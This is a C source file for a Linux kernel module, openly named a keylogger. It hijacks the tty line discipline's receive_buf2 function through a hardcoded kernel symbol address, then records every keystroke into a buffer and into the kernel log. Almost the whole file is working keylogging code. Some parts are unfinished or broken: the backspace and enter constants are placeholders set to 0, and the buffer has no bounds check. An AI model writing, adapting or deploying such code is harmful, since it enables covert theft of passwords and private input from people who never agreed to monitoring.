// Keylogger

// TODO
#define BACKSPACE_KEY 0
#define ENTER_KEY 0

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/kref.h>
#include <linux/fs.h>
#include <linux/tty.h>
#include <linux/tty_ldisc.h>

// Store pointer to tty_ldisc_ops
static struct tty_ldisc_ops *our_n_tty_ops;
// Point to original receive_buf2
static int (*original_receive_buf2) (struct tty_struct*, const unsigned char*, char*, int);

// For storing buffer
struct line_buf {
	char line[100000];
	int pos;
};

static struct line_buf key_buf;

static void log_keys(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
{
	// Check if there is nothing to log 
	// TODO: TTY changed for 20.04. Find equivalent flags
	// if (!tty->read_buf || tty->real_raw) {
	// 	return;
	// }

	// Log data in key buffer
	if (count == 1) {
		if (*cp == BACKSPACE_KEY) {
			key_buf.line[--key_buf.pos] = 0;
		} else if (*cp == ENTER_KEY) {
			key_buf.line[key_buf.pos++] = '\n';
		} else {
			key_buf.line[key_buf.pos++] = *cp;
		}
	}

	printk(KERN_INFO "New Character: %c\n", *cp);
}

static int new_receive_buf2(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
{
	log_keys(tty, cp, fp, count);
	return original_receive_buf2(tty, cp, fp, count);
}

static void hijack_tty_ldisc_receive_buf(void)
{
	// Note 1:
	// tty_ldisc_N_TTY is deprecated and replaced by n_tty_ops
	// Source: https://lore.kernel.org/patchwork/patch/634134/
	// n_tty_ops is the struct containing receive_buf fn
	// Ttype of n_tty_ops is struct tty_ldisc_ops
	// Address of n_tty_ops is available via /proc/kallsyms

	// Note 2:
	// Receive_buf2 is preferred over receive_buf

	our_n_tty_ops = (struct tty_ldisc_ops *) 0xffffffffb8b700c0;
	original_receive_buf2 = our_n_tty_ops->receive_buf2;
	our_n_tty_ops->receive_buf2 = new_receive_buf2;
}

static void unhijack_tty_ldisc_receive_buf(void)
{
	our_n_tty_ops->receive_buf2 = original_receive_buf2;
}

int init_module(void)
{
	printk(KERN_INFO "Loading keylogger\n");
	hijack_tty_ldisc_receive_buf();
	printk(KERN_INFO "Finished loading keylogger\n");
	return 0;
}
	
void cleanup_module(void)
{
	printk(KERN_INFO "Unloading keylogger\n");
	unhijack_tty_ldisc_receive_buf();
	printk(KERN_INFO "Finished unloading keylogger\n");
}
